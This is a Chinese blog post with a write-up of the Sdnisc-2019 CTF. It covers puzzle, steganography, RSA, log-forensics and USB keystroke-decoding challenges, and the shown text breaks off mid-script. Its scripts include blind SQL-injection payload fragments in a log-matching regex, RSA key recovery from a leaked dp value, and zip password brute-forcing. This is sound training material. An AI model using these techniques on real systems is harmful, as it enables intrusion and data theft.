<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="Sdnisc-2019"><meta property="og:url" content="http://liul14n.top/2019/11/04/Sdnisc-2019/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/30.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204115.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105093625.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204658.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106090031.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105080300.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164530.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106164553.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140024.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140211.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140631.png"><meta property="og:updated_time" content="2019-11-19T01:16:50.345Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Sdnisc-2019"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/30.png"><link rel="canonical" href="http://liul14n.top/2019/11/04/Sdnisc-2019/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>Sdnisc-2019 | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">60</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2019/11/04/Sdnisc-2019/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">Sdnisc-2019</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-11-04 13:39:00" itemprop="dateCreated datePublished" datetime="2019-11-04T13:39:00+08:00">2019-11-04</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2019-11-19 09:16:50" itemprop="dateModified" datetime="2019-11-19T09:16:50+08:00">2019-11-19</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">74k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">1:02</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/30.png" alt></p><a id="more"></a><hr><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=4978809&auto=1&height=66"></iframe><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>菜是原罪。</li><li>目前还未更完,持续更新中…</li></ul><h1 id="0x01-MISC"><a href="#0x01-MISC" class="headerlink" title="0x01 MISC"></a>0x01 MISC</h1><h2 id="0x001-签到题"><a href="#0x001-签到题" class="headerlink" title="0x001 签到题"></a>0x001 签到题</h2><ul><li>拖入IDA查看字符串即可得到flag,或者不拖入IDA,直接记事本打开搜索flag也能找到。</li></ul><h2 id="0x002-上下左右"><a href="#0x002-上下左右" class="headerlink" title="0x002 上下左右"></a>0x002 上下左右</h2><ul><li><p>脑洞大开的题目,考察PIL库或者turtal库等的使用。</p></li><li><p>D代表Down(下),R代表Right(右),L代表Left(左),U代表UP(上)。</p></li><li><p>脚本如下。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#xyij这几个可以根据情况自行在合适的范围内调整。</span></span><br><span class="line">x = <span class="number">200</span></span><br><span class="line">y = <span class="number">200</span></span><br><span class="line">i = <span class="number">5</span></span><br><span class="line">j = <span class="number">5</span></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))</span><br><span class="line">im.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\flag.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    str = file.read()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">'D'</span>:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'R'</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'U'</span>:</span><br><span class="line">            j-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s == <span class="string">'L'</span>:</span><br><span class="line">            i-=<span class="number">1</span></span><br><span class="line">        im.putpixel((i, j), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><ul><li>运行脚本就能画出来flag了。</li></ul><h2 id="0x003-压缩包的秘密"><a href="#0x003-压缩包的秘密" class="headerlink" title="0x003 压缩包的秘密"></a>0x003 压缩包的秘密</h2><ul><li>用16进制查看器查看文件发现压缩包flag.zip的每相邻两个字节互换了位置,写个脚本还原回去。脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\misc3\\flag.zip'</span>,<span class="string">'rb'</span>)</span><br><span class="line">ff = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\misc3\\newflag.zip'</span>,<span class="string">'wb'</span>)</span><br><span class="line">str = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str),<span class="number">2</span>):</span><br><span class="line">    ff.write(str[i+<span class="number">1</span>])</span><br><span class="line">    ff.write(str[i])</span><br><span class="line">f.close()</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><ul><li>还原以后发现压缩包有密码,用16进制查看器查看发现尾部有一段字符串<code>dGhlcmUtaXMtaGFsZi1wd2Qtc2hlbnNp</code>,是一段base64,解码以后是<code>there-is-half-pwd-shensi</code>,也就是说<code>shensi</code>是压缩包密码的一半。</li><li>那么掩码爆破另外6个字符即可,不到半分钟就能爆破出来,爆破得到最终密码为<code>sdniscshensi</code>,解压压缩包即可得到flag。</li></ul><h1 id="0x02-Stego"><a href="#0x02-Stego" class="headerlink" title="0x02 Stego"></a>0x02 Stego</h1><h2 id="0x001-啾咪"><a href="#0x001-啾咪" class="headerlink" title="0x001 啾咪~"></a>0x001 啾咪~</h2><ul><li><p>又一道想暴打出题人的题目,这道题竟然有一半左右的人做出来???</p></li><li><p>用Stegosolve打开,Analyse-Data Extract。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204115.png" alt></p><ul><li>这么勾选(这道题是BGR)然后点Preview,能找到一串base64(出题人还不忘提醒这就是flag.txt),解码得到flag。</li></ul><h2 id="0x002-我和我的祖国"><a href="#0x002-我和我的祖国" class="headerlink" title="0x002 我和我的祖国"></a>0x002 我和我的祖国</h2><ul><li>考察音频隐写。</li><li>将附件拖入Audacity,在末尾,有猫腻。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105093625.png" alt></p><ul><li>向上表示1,向下表示0得到<code>0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101</code></li><li>bin转ascii得到flag。</li></ul><h2 id="0x003-你真的很不错"><a href="#0x003-你真的很不错" class="headerlink" title="0x003 你真的很不错"></a>0x003 你真的很不错</h2><ul><li><p>根据题目提示要求用winrar,考虑到这道题目是NTFS流隐写。</p></li><li><p>打开工具NtfsStreamsEditor,用winrar将附件flag.rar里面的内容解压出来,然后在NtfsStreamsEditor搜索,找到flag.png。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191105204658.png" alt></p><ul><li>导出flag.png,查看该图片即可得到flag。</li></ul><h1 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h1><h2 id="0x001-简单的密码学"><a href="#0x001-简单的密码学" class="headerlink" title="0x001 简单的密码学"></a>0x001 简单的密码学</h2><ul><li>考察培根密码,解密得到<code>BACONEASY</code>。</li></ul><h2 id="0x003-被加密的消息"><a href="#0x003-被加密的消息" class="headerlink" title="0x003 被加密的消息"></a>0x003 被加密的消息</h2><ul><li><p>考察RSA相关知识。</p></li><li><p>后续会写一篇关于RSA的博客, 解密脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">132874559018378928431039440207926203692459793792348908672840445003264268709142821089064063059664054997624354040367339834740402484489217092916932927523665031792688652405172441259540233143526085691290500429921362666149858204259223146323188880312113596285869242888916181594189809400830983088384594648368192585387</span></span><br><span class="line">dp = <span class="number">591317922916712527852981087692920294081526731184970969084059479425641071480269272618065340614260809042370271672930352969371906804874484366604552515101473</span></span><br><span class="line">c = <span class="number">105561263344197224500437985369890277605607419491189003046055021715638244356677672489534224683808733691744645034854814587326664189059178955870261337977176277155277781998771630340367082086864012637516012166291357901866101513273848851471805311144501065601880125348980410104702516232148506526616670074084982119236</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">            p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">            q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = gmpy2.invert(e,phi)%phi</span><br><span class="line">            <span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="0x04-Forensic"><a href="#0x04-Forensic" class="headerlink" title="0x04 Forensic"></a>0x04 Forensic</h1><h2 id="0x001-日志分析"><a href="#0x001-日志分析" class="headerlink" title="0x001 日志分析"></a>0x001 日志分析</h2><ul><li><p>考察盲注日志分析以及写脚本(正则)的能力。</p></li><li><p>比赛的时候脚本写不出来,手撕的,费眼而且费了不少时间…</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191106090031.png" alt></p><ul><li>找规律可以得到如上图所示: 在每个<code>C1、C2、C3、C4...</code>区间中,从下往上找第一个状态码200右边的那个值为215的日志对应的%3E后面的那个数。。。那个数就是flag中某一位的ascii码, 而且从C1一直到C38~ 依次找到的是flag的第一位、第二位….第三十八位。</li></ul><ul><li>至于怎么找到的这个规律…WEB选手可能有别的办法,但卑微菜鸡是把<code>flag{</code>正向输出得到ascii码为<code>102 108 97 103 123</code>,然后通过ascii码去找对应的<code>215(Response包的长度)</code>,然后基本找到规律以后又去验证了一下第38位<code>}</code>,根据规律果然能得到应有的结果<code>125</code>。</li></ul><ul><li><p>这种找规律的方法带有猜的因素, 但是前面几道题目的flag大都是38位:<code>flag{</code> + 32位的16进制(大概是md5), + <code>}</code>, 能做出来这个也算是我走运吧~</p></li><li><p>赛后写了个匹配脚本(re大法好):</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\access.log'</span>,<span class="string">'r'</span>)</span><br><span class="line">buf = f.read()</span><br><span class="line"><span class="comment">#匹配所有结果为215的字符串, 匹配两个部位,第一个部位匹配的是C1、C2....Cn,第二个部位匹配flag的Ascii码值。</span></span><br><span class="line">pattern = <span class="string">r'LIMIT%200%2C1%29%2C(\w+)%2C1%29%29%3E(\w+)%20AND%20%27ZeOx%27%3D%27ZeOx HTTP/1.1" 200 215'</span></span><br><span class="line">pattern = re.compile(pattern)</span><br><span class="line"><span class="comment">#利用findall方法大概可以方便一些吧。</span></span><br><span class="line">L = re.findall(pattern,buf)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">Cn = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(L)):</span><br><span class="line">    CurCn = int(L[i][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> CurCn &gt; Cn:</span><br><span class="line">        flag += chr(int(L[i<span class="number">-1</span>][<span class="number">1</span>]))</span><br><span class="line">        Cn = CurCn</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h2 id="0x004-流量分析"><a href="#0x004-流量分析" class="headerlink" title="0x004 流量分析"></a>0x004 流量分析</h2><ul><li><p>考察USB流量分析。</p></li><li><p>用wireshark从附件hack.pcapng中可以提取出来一个zip文件,名字为flag.zip。</p></li><li><p>zip的密码可以通过分析USB流量获得。</p></li></ul><blockquote><p>USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来。</p></blockquote><ul><li><p>Mac或者Linux下的命令为<code>tshark -r hack.pcapng -T fields -e usb.capdata</code>,如果想导入usbdata.txt文件中，后面加上参数：<code>&gt;usbdata.txt</code>。</p></li><li><p>Windows下如果安装了wireshark,可以在wireshark的安装目录下找到tshark.exe,调用cmd定位到wireshark的安装目录下,并将hack.pcapng也放到安装目录下,用命令<code>tshark.exe -r hack.pcapng -T fields -e usb.capdata</code>,同样如果要导入到txt文件中,后面也要加上参数。</p></li></ul><blockquote><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet。</p></blockquote><blockquote><p>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p></blockquote><ul><li>下方通过python字典的形式列出了usb keyboard的映射关系。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>所以完整解密脚本如下(已经将Leftover Capture Data提取到usbdata.txt中):</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\usbdata.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">Lines = f.readlines()</span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span 